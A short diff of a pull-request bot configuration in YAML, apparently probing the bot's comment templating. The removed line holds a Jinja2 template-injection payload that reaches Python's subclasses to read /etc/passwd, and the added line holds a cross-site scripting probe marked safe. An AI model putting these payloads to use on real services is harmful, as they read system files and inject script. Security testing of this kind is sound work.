@@ -64,4 +64,4 @@ pull_request_rules:
       - "base=main"
     actions:
       comment:
-        message: config test {{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
+        message: request test {{'<script>alert(1);</script>'|safe}}
